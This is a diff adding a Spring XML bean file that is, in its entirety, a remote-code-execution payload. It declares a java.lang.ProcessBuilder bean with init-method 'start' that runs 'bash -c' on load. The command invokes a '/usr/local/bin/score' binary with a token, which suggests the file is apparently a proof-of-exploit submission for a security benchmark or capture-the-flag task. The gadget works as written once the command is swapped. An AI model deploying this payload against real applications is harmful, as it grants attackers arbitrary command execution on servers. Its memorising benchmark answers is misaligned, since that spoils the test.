@@ -1,0 +1,11 @@
+<beans>
+    <bean id="exploitBean" class="java.lang.ProcessBuilder" init-method="start">
+        <constructor-arg>
+            <list>
+                <value>bash</value>
+                <value>-c</value>
+                <value>/usr/local/bin/score 2312c18e-9d65-4a4a-bcd9-aaf62c65d95d</value>
+            </list>
+        </constructor-arg>
+    </bean>
+</beans>
